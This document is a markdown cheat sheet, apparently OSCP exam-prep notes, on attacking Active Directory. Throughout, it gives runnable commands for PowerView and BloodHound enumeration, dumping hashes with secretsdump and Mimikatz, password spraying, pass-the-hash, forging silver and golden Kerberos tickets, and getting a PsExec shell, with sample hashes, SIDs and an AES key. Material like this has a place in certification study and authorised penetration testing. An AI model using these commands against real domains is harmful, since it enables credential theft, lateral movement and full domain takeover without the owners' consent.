# OSCP-shortsheet
- 🚀 Prepared as part of my OSCP journey.

# Table of Content
- [Active Directory Pentesting](#active-directory-pentesting)
  - [Enumeration](#enumeration)
    - [Powerview](#powerview)
   
# Active Directory Pentesting

## Enumeration

- To check local administrators in domain joined machine

```powershell
net localgroup Administrators
```

### Powerview

```bash
Import-Module .\PowerView.ps1 #loading module to powershell, if it gives error then change execution policy
Get-NetDomain #basic information about the domain
Get-NetUser #list of all users in the domain
# The above command's outputs can be filtered using "select" command. For example, "Get-NetUser | select cn", here cn is sideheading for   the output of above command. we can select any number of them seperated by comma.
Get-NetGroupMember -GroupName "Domain Admins"       #get SID, Group Doamin name, group name
Get-NetGroup # enumerate domain groups
Get-NetGroup "group name" # information from specific group
Get-NetComputer # enumerate the computer objects in the domain
Find-LocalAdminAccess # scans the network in an attempt to determine if our current user has administrative permissions on any computers in the domain
Get-NetSession -ComputerName files04 -Verbose #Checking logged on users with Get-NetSession, adding verbosity gives more info.
Get-NetUser -SPN | select samaccountname,serviceprincipalname # Listing SPN accounts in domain
Get-ObjectAcl -Identity <user> # enumerates ACE(access control entities), lists SID(security identifier). ObjectSID
Convert-SidToName <sid/objsid> # converting SID/ObjSID to name 

# Checking for "GenericAll" right for a specific group, after obtaining they can be converted using convert-sidtoname
Get-ObjectAcl -Identity "group-name" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights 

Find-DomainShare #find the shares in the domain

Get-DomainUser -PreauthNotRequired -verbose # identifying AS-REP roastable accounts

Get-NetUser -SPN | select serviceprincipalname #Kerberoastable accounts
```

### Bloodhound

- Collection methods - database

```bash
# Sharphound - transfer sharphound.ps1 into the compromised machine
Import-Module .\Sharphound.ps1 
Invoke-BloodHound -CollectionMethod All -OutputDirectory <location> -OutputPrefix "name" # collects and saved with the specified details, output will be saved in windows compromised machine
      e.g. Invoke-BloodHound -CollectionMethod All -Domain MARVEL.local -ZipFileName file.zip
```

- Running Bloodhound

```bash
sudo neo4j console
# then upload the .json files obtained

sudo bloodhound
# then upload the .zip files obtained
```

## **Attacking Active Directory Authentication**

<aside>
💡 Make sure you obtain all the relevant credentials from compromised systems, we cannot survive if we don’t have proper creds.

</aside>

### Tools to dump hashes (tool: secretsdump.py https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
```bash
secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
secretsdump.py -hashes ':NThash' 'DOMAIN/USER@TARGET'
secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
```

### Password Spraying

- Spray with known password on list of found usernames
```bash
# Crackmapexec - check if the output shows 'Pwned!'
crackmapexec <protocol> <target(s)> -u username1 -p password1 password2
crackmapexec <protocol> <target(s)> -u username1 username2 -p password1
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes
        e.g. crackmapexec smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success #use continue-on-success option if it's subnet
        e.g. crackmapexec smb 192.168.1xx.100 -u users.txt -p 'ESMWaterP1p3S!'
        e.g. crackmapexec 192.168.57.0/24 -u fcastle -d MARVEL.local -p Password1
        users.txt from Get-NetUser

# Kerbrute
kerbrute passwordspray -d corp.com .\usernames.txt "pass"
```

- Brute force small number of guess passwords on list of found usernames (tool: Spray-Passwords.ps1)
  ```bash
  .\Spray-Passwords.ps1
  ```

### Pass the hash

- Obtaining hash of an SPN user using **Mimikatz** (Tool: mimikatz)

```powershell
privilege::debug
sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
```

- Pass the hash

```bash
crackmapexec smb 192.168.1.105 -u Administrator -H 32196B56FFE6F45E294117B91A83BF38 -x ipconfig
```

### Silver Tickets

- Obtaining hash of an SPN user using **Mimikatz** (Tool: mimikatz)

```powershell
privilege::debug
sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
```

- Obtaining Domain SID

```powershell
ps> whoami /user
# this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain   SID is "S-1-5-21-1987370270-658905905-1781884369"
```

- Forging silver ticket Ft **Mimikatz**

```bash
kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user>
exit

# we can check the tickets by,
ps> klist
```

- Inject the ticket

```bash
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>
```

- Obtain a shell

```bash
- .\PsExec.exe -accepteula \\<TARGET> cmd
```

### Golden Ticket Ft **Mimikatz**

```bash
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
